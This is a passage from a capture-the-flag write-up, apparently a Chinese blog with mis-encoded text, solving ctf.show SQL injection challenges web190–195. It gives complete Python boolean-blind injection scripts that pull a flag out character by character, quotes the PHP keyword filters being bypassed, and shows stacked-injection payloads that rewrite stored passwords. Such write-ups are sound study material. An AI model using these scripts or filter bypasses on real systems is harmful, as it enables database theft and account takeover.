1&#x3D;2 # è¾“å‡ºç”¨æˆ·åä¸å­˜åœ¨</p><p>è¯´æ˜å­˜åœ¨å¸ƒå°”ç›²æ³¨çš„æ¡ä»¶</p><hr><p>pass é•¿åº¦ä¸º5 å€¼ä¸º admin</p><p>adminâ€™ and length(pass) &#x3D; 5 #</p><p>adminâ€™ and pass &#x3D; â€˜adminâ€™ #</p><p>è¯´æ˜ flag å¹¶ä¸æ˜¯ pass çš„å€¼</p><p>æ¥ä¸‹æ¥å°±æ˜¯æ­£å¸¸çš„ç›²æ³¨</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'https://55202cb2-6c46-4248-a593-31a004489e2a.challenge.ctf.show/api/'</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># æŸ¥æ•°æ®åº“  ctfshow_fl0g,ctfshow_user</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># æŸ¥å­—æ®µ  id,f1ag</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select f1ag from ctfshow_fl0g"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin' and if(ascii(substr((&#123;0&#125;),&#123;1&#125;,1))>&#123;2&#125;,1,2)='1"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"å¯†ç é”™è¯¯"</span><span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web191-ord"><a href="#web191-ord" class="headerlink" title="web191(ord)"></a>web191(ord)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|ascii/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ç”¨æˆ·åéæ³•'</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>banäº†asciiï¼Œå¯ä»¥ä½¿ç”¨ord</p><h4 id="web192-regexp"><a href="#web192-regexp" class="headerlink" title="web192(regexp)"></a>web192(regexp)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|ascii|ord|hex/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ç”¨æˆ·åéæ³•'</span><span class="token punctuation">;</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p><code>ord</code> <code>hex</code>éƒ½è¢«banäº†</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringurl <span class="token operator">=</span> <span class="token string">'https://672395a7-518e-4be5-b990-8af1ef5202c4.challenge.ctf.show/api/'</span>flagstr <span class="token operator">=</span> <span class="token string">" _&#123;&#125;-"</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digitsflag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        <span class="token comment"># æŸ¥æ•°æ®åº“  ctfshow_fl0g,ctfshow_user</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># æŸ¥å­—æ®µ  id,f1ag</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select group_concat(f1ag) from ctfshow_fl0g"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"admin' and if(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)regexp('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">'),1,2)='1"</span></span><span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token number">1</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"å¯†ç é”™è¯¯"</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token string">'&#125;'</span><span class="token punctuation">:</span>                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h4 id="web193-left-right"><a href="#web193-left-right" class="headerlink" title="web193(left right)"></a>web193(left right)</h4><p>è¿‡æ»¤äº†<code>file|into|ascii|ord|hex|substr</code>ï¼Œsubstræ²¡äº†ï¼Œå¯ä»¥ç”¨<code>left() right()</code>ï¼Œå…¶å®ä¹Ÿå¯ä»¥ç”¨<code>mid()</code>ï¼Œè¿™é‡Œå°†æ•°æ®åº“åå­—ç»™æ”¹äº†ï¼Œå’Œ192çš„ä¸ä¸€æ ·ï¼Œéœ€è¦é‡æ–°æ„é€ ä¸€ä¸ªç”¨æ¥æŸ¥è¯¢çš„è¯­å¥ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://df755a50-9318-495a-9788-1c5c721b44e2.challenge.ctf.show:8080/api/"</span>flagstr<span class="token operator">=</span><span class="token string">"abcdefghijklmnopqrstuvwxyz1234567890_&#123;-&#125; ,"</span>flag<span class="token operator">=</span><span class="token string">"ctf"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        change<span class="token operator">=</span>flag<span class="token operator">+</span>j        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"admin' and if(left((select group_concat(f1ag)from ctfshow_flxg),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">)regexp('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>change<span class="token punctuation">&#125;</span></span><span class="token string">'),1,0)=1#"</span></span>        <span class="token comment">#payload = f"admin' and if((select group_concat(f1ag)from ctfshow_flxg)regexp('&#123;change&#125;'),1,0)=1#"</span>        <span class="token comment">#ç¬¬äºŒä¸ªpayloadæ²¡æœ‰ä½¿ç”¨æˆªæ–­å­—ç¬¦ä¸²çš„å‡½æ•°ï¼Œç›´æ¥ä½¿ç”¨regexpè¿›è¡Œçš„åŒ¹é…</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"å¯†ç é”™è¯¯"</span> <span class="token operator">==</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span></code></pre><p>å¯ä»¥å°†payloadçš„leftç»™å»æ‰ï¼Œç›´æ¥æ­£åˆ™åŒ¹é…ï¼Œä¸è¿‡éœ€è¦èµ·ä¸€ä¸ªâ€™ctfshow{â€˜çš„å¤´å°±è¡Œå°±è¡Œã€‚Y4å¤§ä½¬çš„åšæ³•æ˜¯ï¼Œå°†<code>&#123;</code>æ”¾åˆ°äº†<code>flagstr</code>çš„å‰è¾¹</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringurl <span class="token operator">=</span> <span class="token string">"https://d8ecee4e-9c33-46b3-af79-befbc602b859.challenge.ctf.show/api/"</span>flagstr <span class="token operator">=</span> <span class="token string">" _&#123;&#125;-"</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digitsflag <span class="token operator">=</span> <span class="token string">'ctf'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        tmp <span class="token operator">=</span> flag <span class="token operator">+</span> j        <span class="token comment"># æŸ¥æ•°æ®åº“  ctfshow_flxg,ctfshow_user</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># æŸ¥å­—æ®µ  id,f1ag</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select group_concat(f1ag) from ctfshow_flxg"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"admin' and if((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">)regexp('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tmp<span class="token punctuation">&#125;</span></span><span class="token string">'),1,2)='1"</span></span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"å¯†ç é”™è¯¯"</span> <span class="token operator">==</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"&#125;"</span> <span class="token operator">==</span> j<span class="token punctuation">:</span>                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p>äºŒåˆ†æ³•ä¾ç„¶å¯è¡Œï¼Œåªæ˜¯å¹¶ä¸æ˜¯å•ç‹¬çš„å­—ç¬¦æ¯”è¾ƒï¼Œæ˜¯å­—ç¬¦ä¸²çš„æ¯”è¾ƒï¼Œä½†åŸç†æ˜¯ä¸€æ ·çš„ã€‚<br>å³ï¼šab&#x3D;abï¼Œab&lt;acï¼Œæ˜¯å¯¹å­—ç¬¦ä¸²ä¸ä¸€è‡´çš„ç¬¬ä¸€å­—ç¬¦è¿›è¡Œæ¯”è¾ƒã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token keyword">import</span> time<span class="token keyword">import</span> stringurl <span class="token operator">=</span> <span class="token string">"http://fa58a58a-11d4-4c3e-9009-e7a0c53565b8.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">max</span> <span class="token operator">=</span> <span class="token number">127</span>    <span class="token builtin">min</span> <span class="token operator">=</span> <span class="token number">32</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">max</span><span class="token operator">+</span><span class="token builtin">min</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">min</span> <span class="token operator">==</span> mid<span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>        payload <span class="token operator">=</span> <span class="token string">"admin'and ((left((select f1ag from ctfshow_flxg),&#123;&#125;)&lt;'&#123;&#125;'))#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>flag<span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#print(payload)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8bef"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token builtin">max</span> <span class="token operator">=</span> mid        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">min</span> <span class="token operator">=</span> mid </code></pre><h4 id="web194-lpad"><a href="#web194-lpad" class="headerlink" title="web194(lpad)"></a>web194(lpad)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|ascii|ord|hex|substr|char|left|right|substring/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ç”¨æˆ·åéæ³•'</span><span class="token punctuation">;</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p><code>left</code> <code>right</code>è¢«banäº†ï¼Œå¯ä»¥ç›´æ¥æ­£åˆ™åŒ¹é…ï¼Œä¸è¿‡ç›´æ¥æ­£åˆ™çš„æ–¹æ³•æœ‰å±€é™</p><p>æ‰¾ä¸€æ‰¾å…¶ä»–å’Œæˆªå–æœ‰å…³çš„å‡½æ•°ï¼Œå‘ç°<code>lpad()</code>ã€‚</p><p><code>lpad(str,len,padstr)</code><br><code>lpad()</code>å‡½æ•°è¿”å›å­—ç¬¦ä¸²<code>str</code>ï¼Œ<code>len</code>å°äºå­—ç¬¦ä¸²é•¿åº¦ç›¸å½“äºå­—ç¬¦ä¸²æˆªå–ï¼›å¤§äºå­—ç¬¦ä¸²é•¿åº¦ï¼Œåˆ™åœ¨å·¦å¡«å……ç”¨å­—ç¬¦ä¸²<code>padstr</code>ç›´åˆ°è¾¾åˆ°<code>len</code>å­—ç¬¦é•¿åº¦ã€‚</p><p>æœ‰å·¦å¡«å……ï¼Œä¸€èˆ¬å°±æ˜¯å³å¡«å……ï¼Œæ‰¾åˆ°<code>rpad()</code>ï¼Œç”¨æ³•å’Œ<code>lpad()</code>ç±»ä¼¼ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://8be98a09-12b0-4f66-807f-899826d58216.challenge.ctf.show/api/"</span>flagstr <span class="token operator">=</span> <span class="token string">",_&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789"</span>tempstr <span class="token operator">=</span> <span class="token string">""</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> mid <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        <span class="token comment">#payload = "admin'and ((lpad((select database()),&#123;&#125;,'')='&#123;&#125;'))#".format(i,tempstr+mid)</span>        <span class="token comment">#ctfshow_web</span>        <span class="token comment">#payload = "admin'and ((lpad((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,'')='&#123;&#125;'))#".format(i,tempstr+mid)</span>        <span class="token comment">#ctfshow_flxg</span>        <span class="token comment">#payload = "admin'and ((lpad((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg'),&#123;&#125;,'')='&#123;&#125;'))#".format(i,tempstr+mid)</span>        <span class="token comment">#id,f1ag</span>        payload <span class="token operator">=</span> <span class="token string">"admin'and ((lpad((select f1ag from ctfshow_flxg),&#123;&#125;,'')='&#123;&#125;'))#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>tempstr<span class="token operator">+</span>mid<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8bef"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            tempstr <span class="token operator">+=</span> mid            flag <span class="token operator">+=</span> mid            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"++++++++++++++++++++"</span><span class="token operator">+</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h4 id="web195-å †å æ³¨å…¥"><a href="#web195-å †å æ³¨å…¥" class="headerlink" title="web195(å †å æ³¨å…¥)"></a>web195(å †å æ³¨å…¥)</h4><p>è¿”å›é€»è¾‘</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//å¯†ç æ£€æµ‹</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'å¯†ç åªèƒ½ä¸ºæ•°å­—'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//å¯†ç åˆ¤æ–­</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ç™»é™†æˆåŠŸ'</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token comment">//TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª,ä¸ä¼šåˆåŒå’å•è¢«ä¸€è¡€äº†å§</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ç”¨æˆ·åéæ³•'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"ç™»é™†æˆåŠŸ flag is <span class="token interpolation"><span class="token variable">$flag</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    </code></pre><p>è¿‡æ»¤äº†selectï¼Œå•åŒå¼•å·ä¹Ÿè¢«è¿‡æ»¤ï¼Œæ²¡æœ‰æŠ¥é”™æç¤ºã€‚</p><p>æ²¡æœ‰è¿‡æ»¤åˆ†å·ï¼Œè€ƒè™‘å †å æ³¨å…¥ã€‚ä½†ä¸èƒ½æœ‰ç©ºæ ¼ï¼Œå¯ä»¥é€šè¿‡åå¼•å·åŒ…è£¹è¡¨åç­‰ä¿¡æ¯çš„æ–¹å¼ç»•è¿‡ç©ºæ ¼è¿‡æ»¤ã€‚</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">update</span><span class="token identifier"><span class="token punctuation">`</span>ctfshow_user<span class="token punctuation">`</span></span><span class="token keyword">set</span><span class="token identifier"><span class="token punctuation">`</span>pass<span class="token punctuation">`</span></span><span class="token operator">=</span><span class="token number">1</span></code></pre><p>è¿™é‡Œç”¨updateå°†passæ”¹ä¸º1ï¼Œå¯ä»¥ç™»é™†æˆåŠŸ</p><p>å› ä¸ºæŸ¥è¯¢è¯­å¥çš„whereåˆ¤æ–­æ˜¯<code>username=&#123;$username&#125;</code>ï¼Œå¹¶æ²¡æœ‰å¼•å·åŒ…è£¹ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¾“å…¥æ•°å­—äº†ã€‚</p><p>sqlé‡Œï¼Œæ•°å­—å’Œå­—ç¬¦ä¸²çš„åŒ¹é…æ˜¯å¼±ç±»å‹æ¯”è¾ƒï¼Œå­—ç¬¦ä¸²ä¼šè½¬æ¢ä¸ºæ•°å­—ï¼Œå¦‚<code>0==admin</code>ï¼Œé‚£ä¹ˆå¦‚æœè¾“å…¥çš„usernameæ˜¯0ï¼Œåˆ™ä¼šåŒ¹é…æ‰€æœ‰å¼€å¤´ä¸</p><p>æ˜¯æ•°å­—æˆ–è€…ä¸º0çš„å­—ç¬¦ä¸²å’Œæ•°å­—0</p><p>ä½†æ˜¯å¯ä»¥ä½¿ç”¨å¦ä¸€ç§æ–¹æ³•</p><pre class="language-sql" data-language="sql"><code class="language-sql">payload<span class="token operator">=</span><span class="token string">"0x61646d696e;update`ctfshow_user`set`pass`=0x313131;"</span><span class="token comment"># 